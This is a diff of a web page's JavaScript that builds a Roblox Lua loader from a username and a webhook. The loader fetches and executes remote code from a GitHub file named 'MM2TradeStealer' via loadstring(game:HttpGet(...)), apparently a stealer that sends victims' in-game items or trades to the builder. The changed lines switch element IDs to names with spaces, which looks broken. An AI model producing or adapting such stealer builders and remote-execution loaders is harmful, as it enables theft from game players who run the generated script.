@@ -71,8 +71,8 @@
 
   <script>
     function generateOutput() {
-      const username = document.getElementById("username").value;
-      const webhook = document.getElementById("webhook").value;
+      const username = document.getElementById("local userName").value;
+      const webhook = document.getElementById("local webHook").value;
       const outputString = `local userName = "${username}"\n` +
                            `local webHook = "${webhook}"\n` +
                            'loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripty/Eks0va133/main/MM2TradeStealer", true))();
